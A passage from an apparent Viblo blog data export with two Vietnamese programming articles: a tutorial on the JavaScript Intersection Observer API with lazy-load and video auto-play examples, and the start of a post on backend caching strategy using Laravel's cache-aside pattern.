        "M\u1edf \u0111\u1ea7u\n\nB\u1ea1n \u0111\u00e3 bao gi\u1edd nghe \u0111\u1ebfn intersection observer hay s\u1eed d\u1ee5ng n\u00f3 trong javascript ch\u01b0a. N\u1ebfu ch\u01b0a th\u00ec trong b\u00e0i vi\u1ebft n\u00e0y m\u00ecnh s\u1ebd gi\u1edbi thi\u1ec7u \u0111\u1ebfn c\u00e1c b\u1ea1n intersection observer l\u00e0 g\u00ec v\u00e0 s\u1eed d\u1ee5ng n\u00f3 ...",
      contents:
        "### M\u1edf \u0111\u1ea7u\n\nB\u1ea1n \u0111\u00e3 bao gi\u1edd nghe \u0111\u1ebfn intersection observer hay s\u1eed d\u1ee5ng n\u00f3 trong javascript ch\u01b0a. N\u1ebfu ch\u01b0a th\u00ec trong b\u00e0i vi\u1ebft n\u00e0y m\u00ecnh s\u1ebd gi\u1edbi thi\u1ec7u \u0111\u1ebfn c\u00e1c b\u1ea1n intersection observer l\u00e0 g\u00ec v\u00e0 s\u1eed d\u1ee5ng n\u00f3 v\u1edbi m\u1ee5c \u0111\u00edch g\u00ec nh\u00e9. N\u00e0o h\u00e3y c\u00f9ng m\u00ecnh t\u00ecm hi\u1ec3u. \n\n### V\u00ed d\u1ee5\n\nV\u1edbi Intersection Observer, ch\u00fang ta c\u00f3 th\u1ec3 l\u1eafng nghe s\u1ef1 thay \u0111\u1ed5i c\u1ee7a m\u1ed9t element trong viewport (v\u00f9ng hi\u1ec3n th\u1ecb tr\u00ean m\u00e0n h\u00ecnh).\n\nN\u1ebfu b\u1ea1n ch\u01b0a hi\u1ec3u ch\u1ee9c n\u0103ng n\u00e0y \u0111\u1ec3 l\u00e0m g\u00ec th\u00ec c\u00f9ng m\u00ecnh \u0111\u1ebfn v\u1edbi v\u00ed d\u1ee5 c\u1ee5 th\u1ec3 sau. Ch\u1eb3ng h\u1ea1n b\u1ea1n mu\u1ed1n lazyload h\u00ecnh \u1ea3nh ch\u1ec9 khi n\u00e0o thanh scroll l\u0103n \u0111\u1ebfn khu v\u1ef1c ch\u01b0a h\u00ecnh \u1ea3nh \u0111\u00f3. B\u1ea1n c\u00f3 th\u1ec3 l\u00e0m \u0111i\u1ec1u n\u00e0y b\u1eb1ng c\u00e1ch l\u1eafng nghe s\u1ef1 ki\u1ec7n scroll v\u00e0 check xem image \u0111\u00f3 \u0111\u00e3 n\u1eb1m trong viewport hay ch\u01b0a \u0111\u1ec3 load h\u00ecnh \u1ea3nh \u0111\u00f3 ra.\n\n### C\u00e1c b\u01b0\u1edbc \u0111\u1ec3 th\u1ef1c hi\u1ec7n\n\nC\u00e1c b\u01b0\u1edbc \u0111\u1ec3 th\u1ef1c hi\u1ec7n c\u0169ng r\u1ea5t \u0111\u01a1n gi\u1ea3n:\n    - T\u1ea1o \u0111\u1ed1i tr\u01b0\u1ee3ng Intersection Observer.\n    - G\u1eafn element c\u1ea7n l\u1eafng nghe s\u1ef1 ki\u1ec7n v\u00e0o.\n    \n#### 1.  T\u1ea1o \u0111\u1ed1i t\u01b0\u1ee3ng Intersection Observer:\n\n\u0110\u1ea7u ti\u00ean l\u00e0 t\u1ea1o Intersection Observer b\u1eb1ng c\u00e1ch:\n\n```\nfunction handler(entries, observer) {\n  console.log(entries);\n}\n\nconst config = {\n  root: null,\n  rootMargin: '0px',\n  threshold: 1.0\n};\n\nconst observer = new IntersectionObserver(handler, config);\n```\n\n\u1ede \u0111\u00e2y m\u00ecnh gi\u1ea3i th\u00edch 1 ch\u00fat v\u1ec1 ph\u1ea7n config. \n - root: L\u00e0 ph\u1ea7n t\u1eed parent c\u1ee7a element \u0111\u01b0\u1ee3c l\u1eafng nghe. \u1ede \u0111\u00e2y m\u00ecnh \u0111\u1eb7t l\u00e0 null c\u00f3 ngh\u0129a parent ch\u00ednh l\u00e0 document.\n - rootMargin: Margin s\u1ebd \u0111\u01b0\u1ee3c th\u00eam v\u00e0o root.\n - threshold: Ph\u1ea7n n\u00e0y s\u1ebd gi\u1edbi h\u1ea1n l\u1ea1i m\u1ee9c \u0111\u1ed9 g\u1ecdi l\u1ea1i callback. Gi\u00e1 tr\u1ecb c\u1ee7a n\u00f3 n\u1eb1m trong kho\u1ea3ng 0 - 1. Ho\u1eb7c c\u00f3 th\u1ec3 l\u00e0 1 m\u1ea3ng. V\u00ed d\u1ee5:\n         + `1`: Callback s\u1ebd \u0111\u01b0\u1ee3c g\u1ecdi khi element hi\u1ec3n th\u1ecb 100% tr\u00ean viewport.\n         + `0`: Callback s\u1ebd \u0111\u01b0\u1ee3c g\u1ecdi ngay khi element v\u1eeba hi\u1ec3n th\u1ecb \u0111\u01b0\u1ee3c 1px tr\u00ean viewport. V\u00e0 \u0111\u00e2y c\u0169ng l\u00e0 gi\u00e1 tr\u1ecb m\u1eb7c \u0111\u1ecbnh n\u1ebfu m\u00ecnh kh\u00f4ng config.\n         + `0.5`: C\u0169ng t\u01b0\u01a1ng t\u1ef1 nh\u01b0 c\u00e1c gi\u00e1 tr\u1ecb tr\u00ean callback s\u1ebd \u0111\u01b0\u1ee3c g\u1ecdi khi element hi\u1ec3n th\u1ecb \u0111\u01b0\u1ee3c 50% tr\u00ean viewport.\n         + `[0, 0.5, 1]`: Callback s\u1ebd \u0111\u01b0\u1ee3c g\u1ecdi 3 l\u1ea7n v\u00e0o l\u00fac element hi\u1ec3n th\u1ecb \u0111\u01b0\u1ee3c 1px, 50% v\u00e0 100% tr\u00ean viewport.\n\nTrong h\u00e0m callback handler th\u00ec c\u00f3 tham s\u1ed1 entries \u0111\u00e2y ch\u00ednh l\u00e0 m\u1ea3ng c\u00e1c element \u0111\u01b0\u1ee3c l\u1eafng nghe n\u1ebfu ch\u00fang c\u00f3 thay \u0111\u1ed5i. C\u00e1c entries n\u00e0y c\u00f2n c\u00f3 th\u00eam c\u00e1c thu\u1ed1c t\u00ednh \u0111\u1ec3 ki\u1ec3m tra t\u00ecnh tr\u1ea1ng xu\u1ea5t hi\u1ec7n c\u1ee7a element \u0111\u00f3:\n  - entry.boundingClientRect\n  - entry.intersectionRatio\n  - entry.intersectionRect\n  - entry.isIntersecting\n  - entry.rootBounds\n  - entry.target\n  - entry.time\n\n#### 2. G\u1eafn element v\u00e0o \u0111\u1ed1i t\u01b0\u1ee3ng Intersection Observer:\n\nV\u00ed d\u1ee5:\n\n```\nconst image = document.getElementById('content_image');\n\nobserver.observe(image);\n```\n\nSau khi \u0111\u00e3 l\u1eafng nghe s\u1ef1 ki\u1ec7n cho element image, th\u00ec callback s\u1ebd \u0111\u01b0\u1ee3c th\u1ef1c hi\u1ec7n ngay l\u1eadp t\u1ee9c ngay c\u1ea3 khi n\u00f3 kh\u00f4ng n\u1eb1m trong viewport. V\u00e0 sau \u0111\u00f3 n\u00f3 s\u1ebd \u0111\u01b0\u1ee3c g\u1ecdi l\u1ea1i khi n\u00e0o element \u0111\u01b0\u1ee3c hi\u1ec3n th\u1ecb trong viewport.\n\nNgo\u00e0i ra ch\u00fang ta c\u00f3 th\u1ec3 l\u1eafng nghe cho nhi\u1ec1u element c\u00f9ng 1 l\u00fac v\u1edbi c\u00f9ng 1 \u0111\u1ed1i t\u01b0\u1ee3ng observer.\n\n```\nconst images = document.querySelectorAll('.image');\n\nimages.forEach(image => {\n    observer.observe(image);\n});\n```\n\n#### 3. C\u00e1ch h\u1ee7y b\u1ecf observer:\n\nKhi ch\u00fang ta kh\u00f4ng mu\u1ed1n l\u1eafng nghe n\u1eefa th\u00ec c\u00f3 th\u1ec3 d\u00f9ng c\u00e1c c\u00e1ch sau\n- `observer.unobserver(element);` \u0111\u1ec3 h\u1ee7y l\u1eafng nghe cho 1 element \u0111\u00e3 l\u1eafng nghe tr\u01b0\u1edbc \u0111\u00f3.\n- `observer.disconnect();` \u0111\u1ec3 h\u1ee7y l\u1eafng nghe cho t\u1ea5t c\u1ea3 c\u1ea3 element.\n\n#### 4. Th\u1ef1c h\u00e0nh\n\nH\u00e3y \u0111\u1ebfn v\u1edbi ph\u1ea7n th\u1ef1c h\u00e0nh v\u1ec1 intersection observer n\u00e0o.\nV\u00ed d\u1ee5 ch\u00fang ta mu\u1ed1n t\u1ef1 \u0111\u1ed9ng play video khi ch\u00fang ta scroll \u0111\u1ebfn video v\u00e0 pause khi ch\u00fang ta scroll qua video \u0111\u00f3.\n\n```\nconst video = document.getElementById('video');\n\nfunction handler(entries) {\n    const videoEntry = entries[0]; // we have only one entry\n    if(videoEntry.isIntersecting) {\n        video.play();\n    } else {\n        video.pause();\n    }\n}\n\nconst observer = new IntersectionObserver(handler, );\nobserver.observe(video);\n```\n\nL\u1ea7n n\u00e0y ch\u00fang ta kh\u00f4ng c\u1ea7n config v\u00ec m\u00ecnh ch\u1ec9 c\u1ea7n gi\u00e1 tr\u00ed m\u1eb7c \u0111\u1ecbnh th\u00f4i.\n\n### T\u1ed5ng k\u1ebft\n\nNh\u01b0 v\u1eady m\u00ecnh \u0111\u00e3 gi\u1edb thi\u1ec7u cho c\u00e1c b\u1ea1n bi\u1ebft v\u1ec1 t\u00e1c d\u1ee5ng c\u1ee7a Intersection Observer, hy v\u1ecdng n\u00f3 c\u00f3 th\u1ec3 gi\u00fap \u00edch \u0111\u01b0\u1ee3c cho c\u00e1c b\u1ea1n. Ch\u00fac c\u00e1c b\u1ea1n l\u00e0m vi\u1ec7c v\u00e0 h\u1ecdc t\u1eadp hi\u1ec7u qu\u1ea3 :)))))",
      published_at: "2021-02-26 16:29:46",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 4,
      points: 3,
      views_count: 205,
      clips_count: 2,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 19746,
          url: "https://viblo.asia/u/lecaodat",
          avatar: "c0631fcd-6016-42e4-ad5f-d13db98e6ff3.jpeg",
          name: "Cao \u0110\u1ea1t L\u00ea",
          username: "lecaodat",
          followers_count: 14,
          reputation: 553,
          posts_count: 24,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "observer",
            name: "observer",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=observer&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 51043,
      title:
        "Caching \u0111\u1ea1i ph\u00e1p 2: Cache th\u1ebf n\u00e0o cho h\u1ee3p l\u00fd?",
      slug: "ByEZkawE5Q0",
      url:
        "https://viblo.asia/p/caching-dai-phap-2-cache-the-nao-cho-hop-ly-ByEZkawE5Q0",
      user_id: 27607,
      moderation: null,
      transliterated: "caching-dai-phap-2-cache-the-nao-cho-hop-ly",
      contents_short:
        "Caching r\u1ea5t d\u1ec5\n\nM\u00ecnh kh\u00f4ng n\u00f3i \u0111\u00f9a \u0111\u00e2u, caching r\u1ea5t l\u00e0 d\u1ec5. Ai c\u0169ng c\u00f3 th\u1ec3 l\u00e0m \u0111\u01b0\u1ee3c ch\u1ec9 sau 10 ph\u00fat \u0111\u1ecdc tutorial. N\u00f3 c\u0169ng gi\u1ed1ng nh\u01b0 vi\u1ec7c \u0111\u1ee9a tr\u1ebb l\u00ean 3 \u0111\u00e3 c\u00f3 th\u1ec3 c\u1ea7m b\u00fat \u0111\u1ec3 v\u1ebd v\u1eady. Th\u1ebf nh\u01b0ng bi\u1ebft c\u1ea7m...",
      contents:
        "**Caching r\u1ea5t d\u1ec5**\n\nM\u00ecnh kh\u00f4ng n\u00f3i \u0111\u00f9a \u0111\u00e2u, **caching r\u1ea5t l\u00e0 d\u1ec5**. Ai c\u0169ng c\u00f3 th\u1ec3 l\u00e0m \u0111\u01b0\u1ee3c ch\u1ec9 sau 10 ph\u00fat \u0111\u1ecdc tutorial. N\u00f3 c\u0169ng gi\u1ed1ng nh\u01b0 vi\u1ec7c \u0111\u1ee9a tr\u1ebb l\u00ean 3 \u0111\u00e3 c\u00f3 th\u1ec3 c\u1ea7m b\u00fat \u0111\u1ec3 v\u1ebd v\u1eady. Th\u1ebf nh\u01b0ng **bi\u1ebft c\u1ea7m b\u00fat v\u1ebd** kh\u00e1c v\u1edbi vi\u1ec7c **v\u1ebd \u0111\u01b0\u1ee3c c\u00e1i g\u00ec \u0111\u00f3**, v\u00e0 l\u1ea1i c\u00e0ng kh\u00e1c h\u01a1n vi\u1ec7c **v\u1ebd \u0111\u01b0\u1ee3c c\u00e1i g\u00ec \u0111\u00f3 \u0111\u1eb9p**. Ngh\u1ec7 thu\u1eadt caching c\u0169ng v\u1eady.\n\n![](https://images.viblo.asia/77a4dde4-dc3b-450f-a5c5-79bd3270915d.jpg)\n\nN\u1ebfu b\u1ea1n \u0111\u00e3 t\u1eebng nghe \u0111\u1ebfn c\u00e2u n\u00f3i n\u1ed5i ti\u1ebfng n\u00e0y:\n\n> **There are only two hard things in Computer Science: cache invalidation and naming things.** - Phil Karlton\n\nTh\u00ec n\u1ebfu l\u00e0 ng\u01b0\u1eddi ch\u01b0a t\u1eebng s\u1eed d\u1ee5ng cache c\u00e1c b\u1ea1n s\u1ebd t\u1ef1 h\u1ecfi: **cache invalidation** l\u00e0 c\u00e1i g\u00ec m\u00e0 n\u00f3 kh\u00f3 t\u1edbi v\u1eady?\n\nT\u1ea5t nhi\u00ean, cache invalidation c\u00e1c b\u1ea1n \u0111\u1eebng n\u00ean hi\u1ec3u ch\u1ec9 \u1edf v\u1ea5n \u0111\u1ec1 invalidate cache, m\u00e0 h\u00e3y hi\u1ec3u r\u1ed9ng h\u01a1n ra \u0111\u1ebfn v\u1ea5n \u0111\u1ec1 s\u1eed d\u1ee5ng cache n\u00f3i chung.\n\nTrong b\u00e0i vi\u1ebft n\u00e0y m\u00ecnh s\u1ebd \u0111\u1ec1 c\u1eadp \u0111\u1ebfn m\u1ed9t c\u00e2u h\u1ecfi m\u00e0 \u0111\u1ebfn t\u1eadn b\u00e2y gi\u1edd v\u1eabn kh\u00f4ng c\u00f3 l\u1eddi gi\u1ea3i ch\u00ednh x\u00e1c, c\u0169ng kh\u00f4ng c\u00f3 nh\u1eefng \u0111\u1ecbnh l\u00fd m\u1ec7nh \u0111\u1ec1 \u0111\u01b0\u1ee3c \u0111\u00fac k\u1ebft th\u00e0nh s\u00e1ch v\u1edf m\u00e0 ch\u1ec9 c\u00f3 kinh nghi\u1ec7m \u0111\u01b0\u1ee3c truy\u1ec1n mi\u1ec7ng t\u1eeb nh\u1eefng b\u1eadc ti\u1ec1n nh\u00e2n. \u0110\u00f3 ch\u00ednh l\u00e0 c\u00e2u h\u1ecfi: **Cache th\u1ebf n\u00e0o cho h\u1ee3p l\u00fd?**.\n\n## First things first\n\n\u0110\u1ea7u ti\u00ean l\u00e0 1 ch\u00fat chia s\u1ebb v\u1ec1 c\u00e2u chuy\u1ec7n \u0111\u01b0a m\u00ecnh t\u1edbi b\u00e0i vi\u1ebft n\u00e0y. Vi\u1ec7c \u0111\u1ea7y nhan nh\u1ea3n tutorial tr\u00ean m\u1ea1ng v\u1ec1 caching khi\u1ebfn cho m\u00ecnh c\u00f3 1 nh\u1eadn \u0111\u1ecbnh sai l\u1ea7m l\u00e0 vi\u1ebft v\u1ec1 caching c\u0169ng d\u1ec5 nh\u01b0 t\u00ecm th\u1ea5y tutorial v\u1ec1 n\u00f3. Nh\u01b0ng KH\u00d4NG, vi\u1ebft v\u1ec1 caching r\u1ea5t kh\u00f3. M\u00ecnh ph\u1ea3i th\u1eeba nh\u1eadn v\u1eady khi \u0111\u1eb7t b\u00fat vi\u1ebft series [Caching \u0111\u1ea1i ph\u00e1p](https://viblo.asia/s/caching-dai-phap-QqKLvpNbl7z) n\u00e0y. N\u00f3 ti\u00eau t\u1ed1n c\u1ee7a m\u00ecnh r\u1ea5t r\u1ea5t nhi\u1ec1u th\u1eddi gian, g\u00f5 ra r\u1ed3i l\u1ea1i x\u00f3a \u0111i, x\u00f3a \u0111i r\u1ed3i l\u1ea1i g\u00f5 l\u1ea1i,...\n\nM\u00ecnh vi\u1ebft ra xong, c\u1ea3m th\u1ea5y c\u00f3 g\u00ec \u0111\u00f3 ch\u01b0a \u0111\u00fang l\u1eafm, l\u1ea1i x\u00f3a \u0111i, r\u1ed3i l\u1ea1i t\u00ecm hi\u1ec3u th\u00eam s\u00e1ch v\u1edf, r\u1ed3i l\u1ea1i vi\u1ebft ti\u1ebfp, xong l\u1ea1i x\u00f3a \u0111i, r\u1ed3i \u0111i tham v\u1ea5n c\u00e1c \u0111\u00e0n anh \u0111i tr\u01b0\u1edbc, vi\u1ebft ti\u1ebfp, xong l\u1ea1i x\u00f3a \u0111i... Qu\u00e1 tr\u00ecnh n\u00e0y c\u1ee9 l\u1eb7p \u0111i l\u1eb7p l\u1ea1i v\u00e0i ng\u00e0y. C\u00f3 l\u00fac m\u00ecnh ph\u1ea3i x\u00f3a \u0111i ho\u00e0n to\u00e0n \u0111\u1ec3 vi\u1ebft l\u1ea1i theo 1 c\u00e1ch ti\u1ebfp c\u1eadn kh\u00e1c m\u00e0 m\u00ecnh th\u1ea5y l\u00e0 d\u1ec5 ti\u1ebfp thu h\u01a1n. C\u00e1i m\u00e0 c\u00e1c b\u1ea1n \u0111ang \u0111\u1ecdc \u0111\u00e2y c\u00f3 th\u1ec3 l\u00e0 phi\u00ean b\u1ea3n th\u1ee9 7 hay 8 g\u00ec \u0111\u00f3. Hy v\u1ecdng l\u00e0 k\u1ec3 c\u1ea3 n\u00f3 ch\u01b0a ho\u00e0n thi\u1ec7n th\u00ec c\u0169ng gi\u00fap \u00edch \u0111\u01b0\u1ee3c c\u00e1c b\u1ea1n \u0111i\u1ec1u g\u00ec \u0111\u00f3 v\u1ec1 ch\u1ee7 \u0111\u1ec1 n\u00e0y.\n\n\u00c0 qu\u00ean, m\u00ecnh l\u00e0 Minh Monmen, developer ki\u00eam devops v\u1edbi s\u1edf th\u00edch to l\u1edbn v\u1ec1 solution architect v\u00e0 security. (\u0111am m\u00ea th\u00f4i ch\u1ee9 m\u00ecnh m\u1edbi t\u00ecm \u0111\u01b0\u1ee3c l\u1ed7 h\u1ed5ng 2 trang n\u1ea1p th\u1ebb kh\u00e1 l\u1edbn xong, nh\u01b0 ng\u01b0\u1eddi ta m\u00e0 hack d\u1eef li\u1ec7u \u0111i b\u00e1n ch\u1eafc c\u0169ng ch\u1ee5c ng\u00e0n \u0111\u00f4 l\u00e0 \u00edt r\u1ed3i, \u0111\u00e2y ch\u1ec9 \u0111\u01b0\u1ee3c l\u1eddi c\u1ea3m \u01a1n su\u00f4ng n\u00ean ch\u00e1n \u0111\u1eddi l\u1eafm).\n\nTr\u1edf l\u1ea1i v\u1edbi b\u00e0i vi\u1ebft, th\u00ec \u0111\u00e2y l\u00e0 b\u00e0i vi\u1ebft th\u1ee9 2 c\u1ee7a series [Caching \u0111\u1ea1i ph\u00e1p](https://viblo.asia/s/caching-dai-phap-QqKLvpNbl7z):\n\n- [Caching \u0111\u1ea1i ph\u00e1p 1: N\u1ea5c thang l\u00ean level c\u1ee7a developer](https://viblo.asia/p/caching-dai-phap-1-nac-thang-len-level-cua-developer-V3m5WdO8KO7)\n- **Caching \u0111\u1ea1i ph\u00e1p 2: Cache th\u1ebf n\u00e0o cho h\u1ee3p l\u00fd** <~ YOU ARE HERE\n- Caching \u0111\u1ea1i ph\u00e1p 3: V\u1ea5n \u0111\u1ec1 v\u00e0 c\u00e1ch gi\u1ea3i quy\u1ebft\n\nB\u00e0i vi\u1ebft l\u1ea7n tr\u01b0\u1edbc m\u00ecnh \u0111\u00e3 gi\u1edbi thi\u1ec7u cho c\u00e1c b\u1ea1n con \u0111\u01b0\u1eddng m\u00e0 m\u00ecnh \u0111\u00e3 tr\u1ea3i qua c\u00f3 nh\u1eefng lo\u1ea1i cache g\u00ec r\u1ed3i, c\u0169ng n\u00f3i r\u00f5 r\u1eb1ng t\u1ea1i \u0111\u00e2u th\u00ec quy\u1ec1n control c\u1ee7a c\u00e1c b\u1ea1n s\u1ebd l\u00e0 l\u1edbn nh\u1ea5t r\u1ed3i. Trong b\u00e0i vi\u1ebft n\u00e0y m\u00ecnh s\u1ebd \u0111i s\u00e2u h\u01a1n v\u00e0o ph\u1ea7n m\u00e0 c\u00e1c b\u1ea1n c\u00f3 kh\u1ea3 n\u0103ng ki\u1ec3m so\u00e1t t\u1ed1t nh\u1ea5t, ch\u00ednh l\u00e0 **cache \u1edf l\u1edbp backend application**. 3 c\u00e2u h\u1ecfi ch\u00ednh m\u00e0 b\u1ea1n s\u1ebd t\u00ecm c\u00e1ch tr\u1ea3 l\u1eddi t\u1eeb b\u00e0i vi\u1ebft n\u00e0y l\u00e0:\n\n- C\u00f3 c\u1ea7n cache data n\u00e0y kh\u00f4ng?\n- N\u1ebfu c\u00f3, th\u00ec cache \u1edf \u0111\u00e2u?\n- V\u00e0 cache bao l\u00e2u?\n\nR\u00f5 r\u00e0ng ch\u01b0a n\u00e0o? B\u1eaft \u0111\u1ea7u th\u00f4i.\n\n## \u0110o\u1ea1n code quen thu\u1ed9c\n\nTr\u01b0\u1edbc h\u1ebft, c\u00e1c b\u1ea1n h\u00e3y c\u00f9ng xem 1 \u0111o\u1ea1n code r\u1ea5t quen thu\u1ed9c v\u1edbi m\u1ecdi ng\u00f4n ng\u1eef (v\u00ed d\u1ee5 \u0111\u01b0\u1ee3c implement b\u1eb1ng PHP v\u1edbi c\u00fa ph\u00e1p c\u1ee7a framework laravel):\n\n```php\nfunction getArticles() {\n    // Check if cache has data\n    if ( Cache::has('articles') ) {\n        $articles = Cache::get('articles');\n    } else {\n        // Populate articles data from database\n        $articles = Articles::all();\n\n        // Put articles data to cache and set TTL to 60s\n        Cache::put('articles', $articles, 60);\n    }\n    return $articles;\n}\n```\n\n\u0110\u00e2y l\u00e0 \u0111o\u1ea1n code m\u00e0 m\u00ecnh ngh\u0129 ai c\u0169ng \u0111\u00e3 bi\u1ebft c\u00e1ch d\u00f9ng. N\u00f3 c\u0169ng \u0111\u00e3 th\u1ec3 hi\u1ec7n \u0111\u01b0\u1ee3c chi\u1ebfn l\u01b0\u1ee3c cache th\u01b0\u1eddng g\u1eb7p nh\u1ea5t - **cache aside**. C\u1ee5 th\u1ec3 v\u1ec1 flow s\u1ebd nh\u01b0 sau:\n\n![](https://images.viblo.asia/51dec3e1-e966-492e-a458-c03bec24f768.png)\n\n\u0110\u00e2y l\u00e0 chi\u1ebfn l\u01b0\u1ee3c ph\u00f9 h\u1ee3p v\u1edbi nhi\u1ec1u nhu c\u1ea7u, \u0111\u1eb7c bi\u1ec7t l\u00e0 c\u00e1c \u1ee9ng d\u1ee5ng c\u00f3 l\u01b0\u1ee3ng \u0111\u1ecdc > ghi. Trong b\u00e0i vi\u1ebft n\u00e0y th\u00ec m\u00ecnh c\u0169ng kh\u00f4ng n\u00f3i th\u00eam m\u1ea5y c\u00e1i chi\u1ebfn l\u01b0\u1ee3c kh\u00e1c l\u00e0m g\u00ec cho r\u1ed1i r\u1eafm. C\u00e1c b\u1ea1n c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng t\u00ecm th\u1ea5y usecase, \u01b0u \u0111i\u1ec3m, nh\u01b0\u1ee3c \u0111i\u1ec3m,... c\u1ee7a chi\u1ebfn l\u01b0\u1ee3c n\u00e0y \u0111\u1ea7y r\u1eaby tr\u00ean m\u1ea1ng c\u0169ng \u0111\u01b0\u1ee3c.\n\n\u0110o\u1ea1n code n\u00e0y \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng r\u1ed9ng r\u00e3i trong c\u00e1c document c\u1ee7a c\u00e1c th\u01b0 vi\u1ec7n, framework, ng\u00f4n ng\u1eef,... kh\u00e1c nhau. V\u00e0 nh\u01b0 th\u01b0\u1eddng l\u1ec7, k\u1ec3 c\u1ea3 v\u1edbi c\u00e1c b\u1ea1n developer m\u1edbi b\u01b0\u1edbc ch\u00e2n v\u00e0o ngh\u1ec1 v\u00e0 l\u00e0m quen v\u1edbi cache th\u00ec clone \u0111o\u1ea1n code n\u00e0y v\u1ec1 \u1ee9ng d\u1ee5ng c\u1ee7a m\u00ecnh l\u1ea1i qu\u00e1 \u0111\u01a1n gi\u1ea3n \u0111i.\n\nM\u00ecnh th\u1eddi m\u1edbi \u0111i l\u00e0m c\u0169ng th\u01b0\u1eddng d\u00f9ng 1 \u0111o\u1ea1n snippet cache t\u01b0\u01a1ng t\u1ef1 th\u1ebf n\u00e0y \u0111\u1ec3 c\u1ee9 th\u1ea5y ch\u1ed7 n\u00e0o c\u00f3 query DB l\u00e0 nh\u00e9t v\u00f4. T\u1ea5t nhi\u00ean l\u00e0 n\u00f3 c\u0169ng l\u00e0m t\u0103ng t\u1ed1c \u0111\u1ed9 \u1ee9ng d\u1ee5ng c\u1ee7a m\u00ecnh l\u00ean tr\u00f4ng th\u1ea5y. Gi\u1ebft nh\u1ea7m c\u00f2n h\u01a1n b\u1ecf s\u00f3t m\u00e0. Nh\u01b0ng l\u00fac \u0111\u00f3 \u1ee9ng d\u1ee5ng c\u1ee7a m\u00ecnh qu\u00e1 nh\u1ecf v\u00e0 qu\u00e1 \u00edt ng\u01b0\u1eddi d\u00f9ng \u0111\u1ec3 m\u00e0 n\u00f3i t\u1edbi vi\u1ec7c cache \u0111\u00fang hay sai, hi\u1ec7u qu\u1ea3 hay kh\u00f4ng hi\u1ec7u qu\u1ea3. V\u00e0 m\u00ecnh ngh\u0129 l\u00e0 nhi\u1ec1u b\u1ea1n \u1edf \u0111\u00e2y c\u00f3 khi c\u0169ng \u0111ang nh\u01b0 v\u1eady. H\u1ec7 th\u1ed1ng c\u00f3 cache l\u00e0 auto ngon r\u1ed3i ngh\u0129 nhi\u1ec1u l\u00e0m chi.\n\nQua giai \u0111o\u1ea1n chi\u1ebfc chi\u1ebfu m\u1edbi 1 th\u1eddi gian, m\u00ecnh d\u1ea7n d\u1ea7n th\u1ea5y vi\u1ec7c m\u00ecnh s\u1eed d\u1ee5ng cache v\u00f4 t\u1ed9i v\u1ea1 nh\u01b0 tr\u00ean l\u00e0m \u1ee9ng d\u1ee5ng c\u1ee7a m\u00ecnh sai data t\u00e8 le, ch\u1ed7 ch\u1eadm th\u00ec v\u1eabn ch\u1eadm, ch\u1ed7 nhanh th\u00ec ki\u1ec3u ph\u1ea3i c\u00f3 \u0111i\u1ec1u ki\u1ec7n l\u1eaft l\u00e9o m\u1edbi nhanh \u0111\u01b0\u1ee3c, r\u1ed3i full disk, h\u1ebft ram,... M\u00ecnh b\u1eaft \u0111\u1ea7u m\u1edbi suy ng\u1eabm l\u1ea1i 1 c\u00e1ch k\u1ef9 c\u00e0ng v\u1ec1 vi\u1ec7c **khi n\u00e0o th\u00ec cache**, **cache c\u00e1i g\u00ec**, **\u1edf \u0111\u00e2u** v\u00e0 **cache nh\u01b0 th\u1ebf n\u00e0o**.\n\nTh\u1eadt ng\u1ea1c nhi\u00ean l\u00e0 vi\u1ec7c t\u00ecm t\u00e0i li\u1ec7u cho v\u1ea5n \u0111\u1ec1 n\u00e0y l\u1ea1i r\u1ea5t m\u01a1 h\u1ed3. Hay l\u00e0 ng\u01b0\u1eddi ta th\u1ea5y v\u1ea5n \u0111\u1ec1 n\u00f3 \u0111\u01a1n gi\u1ea3n qu\u00e1 r\u1ed3i kh\u00f4ng c\u1ea7n n\u00f3i n\u1eefa kh\u00f4ng bi\u1ebft. C\u00f3 m\u1ea5y quy\u1ec3n s\u00e1ch tr\u00ean O'Reilly c\u00f3 n\u00f3i v\u1ec1 caching, nh\u01b0ng ch\u1ee7 y\u1ebfu l\u00e0 caching HTTP request qua HTTP header. T\u1ee9c l\u00e0 ng\u01b0\u1eddi ta c\u0169ng ch\u1ec9 h\u01b0\u1edbng d\u1eabn **c\u00e1ch l\u00e0m v\u1ec1 m\u1eb7t k\u1ef9 thu\u1eadt**, ch\u1ee9 c\u00f2n kh\u00f4ng th\u1ea5y h\u01b0\u1edbng d\u1eabn **c\u00e1ch l\u00e0m v\u1ec1 m\u1eb7t logic** n\u00e0o c\u1ea3.\n\n## T\u00f4i c\u00f3 c\u1ea7n cache c\u00e1i n\u00e0y kh\u00f4ng?\n\nOk, v\u1eady th\u00ec \u0111\u1ea7u ti\u00ean h\u00e3y tr\u1ea3 l\u1eddi c\u00e2u h\u1ecfi: **T\u00f4i c\u00f3 c\u1ea7n cache c\u00e1i n\u00e0y kh\u00f4ng?** X\u00e1c \u0111\u1ecbnh \u0111\u01b0\u1ee3c m\u00ecnh c\u1ea7n cache c\u00e1i g\u00ec r\u1ea5t quan tr\u1ecdng khi \u1ee9ng d\u1ee5ng c\u1ee7a ch\u00fang ta ng\u00e0y c\u00e0ng ph\u1ee9c t\u1ea1p v\u00e0 c\u00f3 s\u1ef1 tham gia c\u1ee7a nhi\u1ec1u lo\u1ea1i d\u1eef li\u1ec7u. Li\u1ec7u m\u00ecnh n\u00ean cache to\u00e0n b\u1ed9 trang html, hay l\u00e0 cache data sau khi t\u00ednh to\u00e1n, hay l\u00e0 cache ngay data t\u1eeb DB, hay l\u00e0 cache \u0111o\u1ea1n config d\u00f9ng chung?\n\nNh\u01b0 m\u00ecnh c\u00f3 n\u00f3i s\u01a1 qua t\u1eeb b\u00e0i vi\u1ebft \u0111\u1ea7u ti\u00ean. 2 y\u1ebfu t\u1ed1 ch\u00ednh \u0111\u1ec3 c\u00e1c b\u1ea1n 